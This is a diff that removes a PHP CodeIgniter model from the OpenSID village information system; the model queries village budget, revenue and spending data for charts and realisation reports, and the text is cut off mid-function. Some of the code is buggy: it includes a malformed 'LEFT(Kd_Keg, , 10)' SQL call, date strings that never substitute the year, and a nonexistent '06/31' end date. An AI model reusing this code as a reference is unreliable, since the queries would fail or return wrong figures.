@@ -1,1513 +1,545 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Keuangan_grafik_model extends CI_model
-{
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->model('keuangan_model');
-    }
-
-    public function rp_apbd_widget($thn, $opt = false)
-    {
-        $this->db->select('Akun, Nama_Akun');
-        $this->db->join('keuangan_ref_rek1', 'keuangan_ref_rek1.id_keuangan_master = keuangan_master.id', 'left');
-
-        if ($opt) {
-            $this->db->where("Akun NOT LIKE '1.%'");
-            $this->db->where("Akun NOT LIKE '2.%'");
-            $this->db->where("Akun NOT LIKE '3.%'");
-            $this->db->where("Akun NOT LIKE '7.%'");
-        } else {
-            $this->db->where("Akun NOT LIKE '1.%'");
-            $this->db->where("Akun NOT LIKE '7.%'");
-        }
-
-        $this->db->where('tahun_anggaran', $thn);
-        $this->db->order_by('Akun', 'asc');
-        $this->db->group_by('Akun');
-        $this->db->group_by('Nama_Akun');
-        $data['jenis_pelaksanaan'] = $this->db->get('keuangan_master')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('jenis_pelaksanaan');
-        $data['anggaran'] = $this->db->get('keuangan_ta_rab_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(Nilai) AS realisasi');
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_pendapatan'] = $this->db->get('keuangan_ta_tbp_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        //$this->db->where('keuangan_ta_spp.Jn_SPP', 'LS');
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $data['realisasi_belanja'] = $this->db->get('keuangan_ta_spp_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $data['realisasi_belanja_um'] = $this->db->get('keuangan_ta_spp_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(Nilai) AS realisasi');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $data['realisasi_belanja_spj'] = $this->db->get('keuangan_ta_spj_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(Nilai) AS realisasi');
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_bunga'] = $this->db->get('keuangan_ta_mutasi')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(Kredit) AS realisasi');
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_biaya'] = $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 2) AS jenis_pelaksanaan, SUM(debet) AS realisasi');
-        $this->db->group_by('jenis_pelaksanaan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_jurnal'] = $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-
-        return $data;
-    }
-
-    public function r_pd_widget($thn, $opt = false)
-    {
-        $this->db->select('keuangan_ref_rek3.Jenis, keuangan_ref_rek3.Nama_Jenis');
-        $this->db->join('keuangan_ref_rek2', 'keuangan_ref_rek2.id_keuangan_master = keuangan_master.id', 'left');
-        $this->db->join('keuangan_ref_rek3', 'keuangan_ref_rek3.Kelompok = keuangan_ref_rek2.Kelompok', 'left');
-
-        if ($opt) {
-            $this->db->where("keuangan_ref_rek3.Jenis LIKE '4.%'");
-        } else {
-            $this->db->where("keuangan_ref_rek3.Jenis NOT LIKE '1.%'");
-            $this->db->where("keuangan_ref_rek3.Jenis NOT LIKE '5.%'");
-            $this->db->where("keuangan_ref_rek3.Jenis NOT LIKE '6.%'");
-            $this->db->where("keuangan_ref_rek3.Jenis NOT LIKE '7.%'");
-        }
-
-        $this->db->where("keuangan_ref_rek3.Nama_Jenis NOT LIKE '%Hutang%'");
-        $this->db->where("keuangan_ref_rek3.Nama_Jenis NOT LIKE '%Ekuitas SAL%'");
-
-        $this->db->where('tahun_anggaran', $thn);
-        $this->db->order_by('keuangan_ref_rek3.Jenis', 'asc');
-        $data['jenis_pendapatan'] = $this->db->get('keuangan_master')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 6) AS jenis_pendapatan, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', '4.', 'after');
-        $this->db->group_by('jenis_pendapatan');
-        $this->db->where('Tahun', $thn);
-        $data['anggaran'] = $this->db->get('keuangan_ta_rab_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 6) AS jenis_pendapatan, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', '4.', 'after');
-        $this->db->group_by('jenis_pendapatan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_pendapatan'] = $this->db->get('keuangan_ta_tbp_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 6) AS jenis_pendapatan, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', '4.', 'after');
-        $this->db->group_by('jenis_pendapatan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_bunga'] = $this->db->get('keuangan_ta_mutasi')->result_array();
-
-        $this->db->select('LEFT(Kd_Rincian, 6) AS jenis_pendapatan, SUM(Kredit) AS realisasi');
-        $this->db->like('Kd_Rincian', '4.', 'after');
-        $this->db->group_by('jenis_pendapatan');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_jurnal'] = $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-
-        return $data;
-    }
-
-    public function r_bd_widget($thn, $opt = false)
-    {
-        $this->db->select('Kd_Bid, Nama_Bidang');
-        $this->db->join('keuangan_ta_bidang', 'keuangan_ta_bidang.id_keuangan_master = keuangan_master.id', 'left');
-        if ($opt) {
-            $this->db->where("Kd_Bid NOT LIKE '01%'");
-            $this->db->where("Kd_Bid NOT LIKE '02%'");
-            $this->db->where("Kd_Bid NOT LIKE '03%'");
-        } else {
-            $this->db->where("Kd_Bid NOT LIKE '01%'");
-        }
-        $this->db->where('Tahun', $thn);
-
-        $this->db->order_by('Kd_Bid', 'asc');
-        $data['jenis_belanja'] = $this->db->get('keuangan_master')->result_array();
-        // Perlu ditambahkan baris berikut untuk memaksa menampilkan semua bidang di grafik keuangan
-        // TODO: lihat apakah bisa diatasi langsung di script penampilan
-        if (! $opt) {
-            array_unshift($data['jenis_belanja'], ['Kd_Bid' => '03', 'Nama_Bidang' => 'ROW_SPACER']);
-            array_unshift($data['jenis_belanja'], ['Kd_Bid' => '02', 'Nama_Bidang' => 'ROW_SPACER']);
-        }
-
-        $this->db->select('LEFT(Kd_Keg, 10) AS jenis_belanja, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $this->db->group_by('jenis_belanja');
-        $this->db->where('Tahun', $thn);
-        $data['anggaran'] = $this->db->get('keuangan_ta_rab_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Keg, 10) AS jenis_belanja, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->group_by('jenis_belanja');
-        $data['realisasi_belanja'] = $this->db->get('keuangan_ta_spp_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Keg, 10) AS jenis_belanja, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        $this->db->group_by('jenis_belanja');
-        $data['realisasi_belanja_um'] = $this->db->get('keuangan_ta_spp_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Keg, 10) AS jenis_belanja, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('jenis_belanja');
-        $data['realisasi_belanja_spj'] = $this->db->get('keuangan_ta_spj_rinci')->result_array();
-
-        $this->db->select('LEFT(Kd_Keg, 10) AS jenis_belanja, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $this->db->group_by('jenis_belanja');
-        $this->db->where('Tahun', $thn);
-        $data['realisasi_bunga'] = $this->db->get('keuangan_ta_mutasi')->result_array();
-
-        $this->db->select('LEFT(Kd_Keg, , 10) AS jenis_belanja, SUM(keuangan_ta_jurnal_umum_rinci.Debet) AS realisasi');
-        $this->db->like('Kd_Rincian', '5.', 'after');
-        $this->db->group_by('jenis_belanja');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        $data['realisasi_belanja_jurnal'] = $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-
-        return $data;
-    }
-
-    /*
-      lap_rp_apbd merupakan fungsi Akhir (Main) dari semua sub dan sub-sub fungsi :
-
-      Sub fungsi Pendapatan
-      1.1 sub-sub fungsi : Pagu Pendapatan
-      1.2 sub-sub fungsi : Realisasi Pendapatan
-
-      Sub fungsi Belanja
-      2.1 sub-sub fungsi : Pagu Belanja
-      2.2 sub-sub fungsi : Realisasi Belanja
-
-      Sub fungsi Pembiayaan Masuk
-      3.1 sub-sub fungsi : Pagu Pembiayaan Masuk
-      3.1 sub-sub fungsi : Realisasi Pembiayaan Masuk
-
-      Sub fungsi Pembiayaan Keluar
-      4.1 sub-sub fungsi : Pagu Pembiayaan Keluar
-      4.2 sub-sub fungsi : Realisasi Pembiayaan Keluar
-    */
-
-    //Query Laporan Pelaksanaan Realisasi
-    public function lap_rp_apbd($thn, $smt1 = false)
-    {
-        $this->db->select('Akun, Nama_Akun, id_keuangan_master');
-        $this->db->join('keuangan_ref_rek1', 'keuangan_ref_rek1.id_keuangan_master = keuangan_master.id', 'left');
-        $this->db->where("Akun = '4.'");
-        $this->db->where('tahun_anggaran', $thn);
-        $data['pendapatan'] = $this->db->get('keuangan_master')->result_array();
-
-        foreach ($data['pendapatan'] as $i => $p) {
-            $data['pendapatan'][$i]['anggaran']         = $this->pagu_akun($p['Akun'], $thn);
-            $data['pendapatan'][$i]['realisasi']        = $this->real_akun_pendapatan($p['Akun'], $thn, $smt1);
-            $data['pendapatan'][$i]['realisasi_bunga']  = $this->real_akun_pendapatan_bunga($p['Akun'], $thn, $smt1);
-            $data['pendapatan'][$i]['realisasi_jurnal'] = $this->real_akun_pendapatan_jurnal($p['Akun'], $thn, $smt1);
-            $data['pendapatan'][$i]['sub_pendapatan']   = $this->get_subval_pendapatan($p['id_keuangan_master'], $p['Akun'], $thn, $smt1);
-        }
-
-        $this->db->select('Akun, Nama_Akun, id_keuangan_master');
-        $this->db->join('keuangan_ref_rek1', 'keuangan_ref_rek1.id_keuangan_master = keuangan_master.id', 'left');
-        $this->db->where("Akun = '5.'");
-        $this->db->where('tahun_anggaran', $thn);
-        $data['belanja'] = $this->db->get('keuangan_master')->result_array();
-
-        foreach ($data['belanja'] as $i => $p) {
-            $data['belanja'][$i]['anggaran']         = $this->pagu_akun($p['Akun'], $thn);
-            $data['belanja'][$i]['realisasi']        = $this->real_akun_belanja($p['Akun'], $thn, $smt1);
-            $data['belanja'][$i]['realisasi_um']     = $this->real_akun_belanja_um($p['Akun'], $thn, $smt1);
-            $data['belanja'][$i]['realisasi_spj']    = $this->real_akun_belanja_spj($p['Akun'], $thn, $smt1);
-            $data['belanja'][$i]['realisasi_bunga']  = $this->real_akun_belanja_bunga($p['Akun'], $thn, $smt1);
-            $data['belanja'][$i]['realisasi_jurnal'] = $this->real_akun_belanja_jurnal($p['Akun'], $thn, $smt1);
-            $data['belanja'][$i]['sub_belanja']      = $this->get_subval_belanja($p['id_keuangan_master'], $p['Akun'], $thn, $smt1);
-        }
-
-        $this->db->select('Kd_Bid, Nama_Bidang, id_keuangan_master');
-        $this->db->join('keuangan_ta_bidang', 'keuangan_ta_bidang.id_keuangan_master = keuangan_master.id', 'left');
-        $this->db->where('tahun_anggaran', $thn);
-        $data['belanja_bidang'] = $this->db->get('keuangan_master')->result_array();
-
-        foreach ($data['belanja_bidang'] as $i => $p) {
-            $data['belanja_bidang'][$i]['anggaran']         = $this->pagu_akun_bidang($p['Kd_Bid'], $thn);
-            $data['belanja_bidang'][$i]['realisasi']        = $this->real_akun_belanja_bidang($p['Kd_Bid'], $thn, $smt1);
-            $data['belanja_bidang'][$i]['realisasi_um']     = $this->real_akun_belanja_bidang_um($p['Kd_Bid'], $thn, $smt1);
-            $data['belanja_bidang'][$i]['realisasi_spj']    = $this->real_akun_belanja_spj_bidang($p['Kd_Bid'], $thn, $smt1);
-            $data['belanja_bidang'][$i]['realisasi_bunga']  = $this->real_akun_belanja_bunga_bidang($p['Kd_Bid'], $thn, $smt1);
-            $data['belanja_bidang'][$i]['realisasi_jurnal'] = $this->real_akun_belanja_bidang_jurnal($p['Kd_Bid'], $thn, $smt1);
-            $data['belanja_bidang'][$i]['sub_belanja']      = $this->get_subval_belanja_bidang($p['id_keuangan_master'], $p['Kd_Bid'], $thn, $smt1);
-        }
-
-        $this->db->select('Akun, Nama_Akun, id_keuangan_master');
-        $this->db->join('keuangan_ref_rek1', 'keuangan_ref_rek1.id_keuangan_master = keuangan_master.id', 'left');
-        $this->db->where("Akun = '6.'");
-        $this->db->where('tahun_anggaran', $thn);
-        $data['pembiayaan'] = $this->db->get('keuangan_master')->result_array();
-
-        foreach ($data['pembiayaan'] as $i => $p) {
-            $data['pembiayaan'][$i]['anggaran']       = $this->pagu_akun($p['Akun'], $thn);
-            $data['pembiayaan'][$i]['realisasi']      = $this->real_akun_pembiayaan($p['Akun'], $thn, $smt1);
-            $data['pembiayaan'][$i]['sub_pembiayaan'] = $this->get_subval_pembiayaan($p['id_keuangan_master'], $p['Akun'], $thn, $smt1);
-        }
-
-        $this->db->select('Akun, Nama_Akun, id_keuangan_master');
-        $this->db->join('keuangan_ref_rek1', 'keuangan_ref_rek1.id_keuangan_master = keuangan_master.id', 'left');
-        $this->db->where("Akun = '6.'");
-        $this->db->where('tahun_anggaran', $thn);
-        $data['pembiayaan_keluar'] = $this->db->get('keuangan_master')->result_array();
-
-        foreach ($data['pembiayaan_keluar'] as $i => $p) {
-            $data['pembiayaan_keluar'][$i]['anggaran']              = $this->pagu_akun($p['Akun'], $thn);
-            $data['pembiayaan_keluar'][$i]['realisasi']             = $this->real_akun_pembiayaan_keluar($p['Akun'], $thn, $smt1);
-            $data['pembiayaan_keluar'][$i]['sub_pembiayaan_keluar'] = $this->get_subval_pembiayaan_keluar($p['id_keuangan_master'], $p['Akun'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function pagu_akun($akun, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_akun_bidang($akun, $thn)
-    {
-        $this->db->select('LEFT(Kd_Keg, 10) AS Akun, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('LEFT(Kd_Keg, 10)', $akun, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function real_akun_pendapatan($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_tbp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_tbp', 'keuangan_ta_tbp.No_Bukti = keuangan_ta_tbp_rinci.No_Bukti', 'left');
-            $this->db->where('keuangan_ta_tbp.Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_tbp.Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_tbp_rinci')->result_array();
-    }
-
-    private function real_akun_pendapatan_bunga($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_akun_pendapatan_jurnal($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(keuangan_ta_jurnal_umum_rinci.Kredit) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_akun_belanja($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        //$this->db->where('keuangan_ta_spp.Jn_SPP', 'LS');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_akun_belanja_um($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    public function real_akun_belanja_jurnal($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(keuangan_ta_jurnal_umum_rinci.Debet) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('LEFT(Kd_Rincian, 2)');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    public function real_akun_belanja_bidang_jurnal($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('keuangan_ta_jurnal_umum_rinci.Kd_Keg AS kelompok, SUM(keuangan_ta_jurnal_umum_rinci.Debet) AS realisasi');
-        $this->db->like('keuangan_ta_jurnal_umum_rinci.Kd_Keg', $kelompok, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('kelompok');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    public function real_akun_subbelanja_jurnal($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Akun, SUM(keuangan_ta_jurnal_umum_rinci.Debet) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('LEFT(Kd_Rincian, 6)');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_akun_belanja_spj($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_spj_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spj', 'keuangan_ta_spj.No_SPJ = keuangan_ta_spj_rinci.No_SPJ', 'left');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spj_rinci')->result_array();
-    }
-
-    private function real_akun_belanja_bunga($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_akun_belanja_bidang($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Keg, 10) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('LEFT(Kd_Keg, 10)', $akun, 'after');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        //$this->db->where('keuangan_ta_spp.Jn_SPP', 'LS');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_akun_belanja_bidang_um($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Keg, 10) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('LEFT(Kd_Keg, 10)', $akun, 'after');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_akun_belanja_spj_bidang($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Keg, 10) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('LEFT(Kd_Keg, 10)', $akun, 'after');
-        $this->db->where('keuangan_ta_spj_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spj', 'keuangan_ta_spj.No_SPJ = keuangan_ta_spj_rinci.No_SPJ', 'left');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spj_rinci')->result_array();
-    }
-
-    private function real_akun_belanja_bunga_bidang($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Keg, 10) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('LEFT(Kd_Keg, 10)', $akun, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_akun_pembiayaan($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
